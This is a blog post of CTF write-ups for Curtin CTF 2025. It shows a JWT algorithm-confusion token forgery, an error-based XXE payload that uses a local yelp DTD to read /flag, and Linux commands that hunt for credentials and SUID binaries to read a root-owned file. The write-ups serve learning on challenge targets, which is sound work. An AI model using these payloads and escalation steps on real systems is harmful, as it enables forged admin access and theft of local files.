---
title: "Curtin CTF 2025 Selected Writeups"
description: Just a fun little CTF
date: 2025-12-21T09:34:22-05:00
image: 
tags:
    - Ctf
categories:
    - ctf-writeups
comments: false
---

Here are some cool questions from Curtin CTF 2025. Funny how there is no official writeups. Still waiting for NextJS Challenge Writeup lol
## Agent Jonathan Walkins Trafalgar - JWT Confusion
1. None algo does not work
2. Removing auth part of the JWT does not work
3. This is the public key
```
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzzh4QcrzhduRn3K1af38WTQMw1QRDjLTjeQKBiQPxyME2piCb+XKUq5WFJOS0VfpDEaSLTJ1W/S662ANgIAy6qw6Y3iovB7C8WwIC1dZ2/5VdKTX8yjoVYaofjzZGKnoHMxoBkELmH7z7GFoNZB4AJ8XSJx1Ibl4f+Y1TtGN+8xhg+2F8KbbuJhHxYiPPoMGxLNyPvay+t0A8Fxf/Qk8LGwxjIN6qnMDCnpZ6MhOj60Poh493EhZ03/1YhGGXE2S0SYm3jOetnueAc4cXxPTOCe4yS8u+pDg89swqlR/sEtO1H99pojRGv1LceD2m93isiLqLqvkJAuvmOJ6z9a9uQIDAQAB
```
4. I think it is vulnerable to [Algorithm Confusion](https://portswigger.net/web-security/jwt/algorithm-confusion)
```http
GET /flag?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTc2NTA3OTIzMX0.P_CyhS2vWCrsGLxc_tqGrDpaOLJbJ1Jfmz6sR41NLSA HTTP/1.1
```
Output:
```
Invalid signature
```
- Instead of `Unsupported algorithm`
5. First, send the public key to Decoder. The trailing new line is VERY IMPORTANT.
	![Curtin-CTF-2025-1.png](Curtin-CTF-2025-1.png)
6. Go the JWT Editor tab > New Symmetric Key > Generate. Replace the value of `k` with the base64 encoded public key
	![Curtin-CTF-2025-2.png](Curtin-CTF-2025-2.png)
7. Go to `jwt.io` and Generate an example JWT.
	![Curtin-CTF-2025-3.png](Curtin-CTF-2025-3.png)
8. Paste the JWT into the webapp and send it to the server.
9. Send the request to repeater and click on JSON Web Token tab. Select the HS256 Signing key we generated earlier.
	![Curtin-CTF-2025-4.png](Curtin-CTF-2025-4.png)
10. Send the request and we get the flag
```http
GET /flag?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTc2NTA3OTIzMX0.z0s9XqALGaYm5AnA-OUS8Kf5bdOW-9HFxDrfJpOFBbk HTTP/1.1
```
Output:
```
Welcome Admin! Here is your flag: CURTIN_CTF{alg_c0nfus10n_w1th_publ1c_k3y_1s_c00l}
```
## Brailley - Blind XXE
1. This app will send Braille in Number form to the backend.
```http
POST /api/search HTTP/1.1
{"message":"1234010123502402340"}
```
Output:
```
{"ValueSearch": "Welcome! Our center is located in 8 rue de Londres, 75008 Paris, Opening hours for this center is 10:00-19:00"}
```
2. I realise that the number corresponds with the Brialle-Number of each character. Space is 0.
	![Curtin-CTF-2025-5.png](Curtin-CTF-2025-5.png)
```
PARIS => 1234010123502402340
```
3. Let's try to get FLAG
```http
POST /api/search HTTP/1.1
{"message":"124012301012450"}
```
- Does not work
4. Let's try to read the Braille on the website
```
6012012350102401230123015013456036060234501250150601201230240134501450102340234013501402401023450240135013450
```
5. I decided to download the source code to review it. This is the logic of `/api/search` endpoint.
```python
@app.route('/api/search', methods=['POST'])
def api():
  if posted_type == 'application/json':
    # Verify if it is JSON.
    # do something
  # Verify if it is XML.
  elif posted_type == 'application/xml' or posted_type == 'text/xml':
    try:
        # Configure the parser to be vulnerable.
        whatformat = "xml"
        parser = ET.XMLParser(
            dtd_validation=True, load_dtd=True, no_network=True, huge_tree=True)
        tree = ET.parse(StringIO(posted_data), parser)
        elem = tree.getroot()
        processed_data = elem.text
    except ET.ParseError as e:
        # Display error message.
        result = e.message
   # If not JSON or XML.
  else:
    result = {'ValueSearch': 'invalid format'}
```
- Ok, interesting. This application accepts XML Input too.
6. This is an example valid XML input.
```http
POST /api/search HTTP/1.1

Host: curtinctfmy-brailley.chals.io

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE message [

  <!ELEMENT message (#PCDATA)>

]>

<message>1234010123502402340</message>
```
7. There is no direct way for us to exfiltrate file contents so we have to rely on Error-based XXE
```PYTHON
    except ET.ParseError as e:
        # Display error message.
        result = e.message
```
- Reference: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#exploiting-error-based-xxe and https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md
From the Dockerfile, I noticed some non-traditional installs.
```dockerfile
RUN apt-get install -y -q libreoffice
RUN apt-get install -y -q yelp
```
8. Sure enough, we can read local files with the help of yelp's DTD
```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE message [

     <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">



    <!ENTITY % ISOamsa '

        <!ENTITY &#x25; file SYSTEM "file:///flag">

        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">

        &#x25;eval;

        &#x25;error;

        '>



    %local_dtd;

]>

<message>%local_dtd;</message>
```
Output:
```
Invalid URI: file:///abcxyz/CURTIN_CTF{⠞⠓⠼⠉_⠼⠚⠝⠑_⠺⠓⠕_⠋⠑⠼⠉⠇_⠼⠁⠞_⠁⠇⠇_⠺⠊⠞⠓⠼⠚⠥⠞_⠎⠑⠑⠼⠁⠝⠛_⠊⠞_⠼⠙⠇⠇}, line 4, column 15
```
## Misc 7 - Sticky Bit
1. To find the flag, a simple `find` will do
```
find / -name *flag* 2>/dev/null
```
Output:
```
...
/var/flag/flag
...
```
2. The permissions of the file
```
-r-------- 1 root root 19 Nov 30 09:15 /var/flag/flag
```
3. Let's perform cred hunting
```
grep -rn "passw\|pwd" /etc/* 2>/dev/null
```
- Nothing
```
ls -la /etc/cron.*/
/etc/cron.d/:
total 12
drwxr-xr-x 2 root root 4096 Oct 13 14:09 .
drwxr-xr-x 1 root root 4096 Dec  6 07:45 ..
-rw-r--r-- 1 root root  201 Apr  8  2024 e2scrub_all

/etc/cron.daily/:
total 16
drwxr-xr-x 2 root root 4096 Oct 13 14:09 .
drwxr-xr-x 1 root root 4096 Dec  6 07:45 ..
-rwxr-xr-x 1 root root 1478 Mar 22  2024 apt-compat
-rwxr-xr-x 1 root root  123 Feb  5  2024 dpkg
```

```
grep -rnw "ssh-rsa" /usr/* 2>/dev/null | grep ":1"
```
- Nothing
4. Let's find binaries with sticky bit set.
```
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/nullev/null
-rwsr-xr-x 1 root root 39384 Nov 30 09:15 /etc/security/print
-rwsr-xr-x 1 root root 40664 May 30  2024 /usr/bin/newgrp
-rwsr-xr-x 1 root root 72792 May 30  2024 /usr/bin/chfn
-rwsr-xr-x 1 root root 76248 May 30  2024 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 64152 May 30  2024 /usr/bin/passwd
-rwsr-xr-x 1 root root 55680 Jun  5  2025 /usr/bin/su
-rwsr-xr-x 1 root root 51584 Jun  5  2025 /usr/bin/mount
-rwsr-xr-x 1 root root 44760 May 30  2024 /usr/bin/chsh
-rwsr-xr-x 1 root root 39296 Jun  5  2025 /usr/bin/umount
```
5. Ok, after hitting my head and bleeding heavily, I found that `/etc/security/print` enables us to read stuff as root. It is non-traditional binary with sticky bit set
```
ctfuser@569cdb1b2a1d:/etc/security$ ./print /var/flag/flag
./print /var/flag/flag
CURTIN_CTF{$3tU1D}
```
